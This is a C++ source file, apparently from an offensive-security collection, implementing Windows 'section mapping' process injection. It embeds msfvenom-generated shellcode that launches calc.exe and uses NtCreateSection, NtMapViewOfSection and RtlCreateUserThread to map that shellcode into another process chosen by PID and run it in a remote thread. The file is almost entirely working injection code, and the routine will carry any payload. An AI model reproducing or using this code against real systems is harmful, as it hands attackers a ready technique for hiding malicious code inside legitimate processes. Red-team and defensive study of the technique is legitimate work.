/*
* Title: Section Mapping Injection
* Resources:
*	- https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection#code
*/
#include <Windows.h>
#include <stdio.h>
#include "Nt.hpp"

VOID Cleanup(HANDLE hSection, HANDLE hProcess, HANDLE hThread) {
	if (hSection)
		CloseHandle(hSection);
	if (hProcess)
		CloseHandle(hProcess);
	if (hThread)
		CloseHandle(hThread);
}

BOOL SectionMappingInjection() {
	DWORD dwPid = 15424; // Replace it with the target PID.

	// Shellcode generated by `msfvenom -p windows/x64/exec CMD=calc.exe -f c`
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	// Resolve NT function addresses.
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return FALSE;
	_NtCreateSection ntCreateSection = reinterpret_cast<_NtCreateSection>(GetProcAddress(hNtdll, "NtCreateSection"));
	if (!ntCreateSection) return FALSE;
	_NtMapViewOfSection ntMapViewOfSection = reinterpret_cast<_NtMapViewOfSection>(GetProcAddress(hNtdll, "NtMapViewOfSection"));
	if (!ntMapViewOfSection) return FALSE;
	_RtlCreateUserThread rtlCreateUserThread = reinterpret_cast<_RtlCreateUserThread>(GetProcAddress(hNtdll, "RtlCreateUserThread"));
	if (!rtlCreateUserThread) return FALSE;

	// Mapping section.
	SIZE_T dwSize = 4096;
	LARGE_INTEGER sectionSize = { dwSize };
	HANDLE hSection = nullptr;
	NTSTATUS status;

	status = ntCreateSection(
		&hSection,
		SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
		nullptr,
		(PLARGE_INTEGER)&sectionSize,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		nullptr
	);
	if (!NT_SUCCESS(status)) return FALSE;

	// Create a view of the memory section in the local process.
    PVOID pLocalSectionAddr = nullptr;
	status = ntMapViewOfSection(
		hSection,
		GetCurrentProcess(),
		&pLocalSectionAddr,
		0,
		0,
		nullptr,
		&dwSize,
		2,
		0,
		PAGE_READWRITE
	);
	if (!NT_SUCCESS(status)) return FALSE;

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess) {
		Cleanup(hSection, hProcess, nullptr);
		return FALSE;
	}

    PVOID pRemoteSectionAddr = nullptr;
	status = ntMapViewOfSection(
		hSection,
		hProcess,
		&pRemoteSectionAddr,
		0,
		0,
		nullptr,
		&dwSize,
		2,
		0,
		PAGE_EXECUTE_READ
	);
	if (!NT_SUCCESS(status)) {
		Cleanup(hSection, hProcess, nullptr);
		return FALSE;
	}

	// Copy shellcode to the local view, which will get reflected in the target process's mapped view
	memcpy(pLocalSectionAddr, shellcode, sizeof(shellcode));

	HANDLE hThread = nullptr;
	status = rtlCreateUserThread(
		hProcess,
		nullptr,
		FALSE,
		0,
		nullptr,
		nullptr,
		pRemoteSectionAddr,
		nullptr,
		&hThread,
		nullptr
	);
	if (!NT_SUCCESS(status)) {
		Cleanup(hSection, hProcess, hThread);
		return FALSE;
	}

	Cleanup(hSection, hProcess, hThread);

	return TRUE;
}
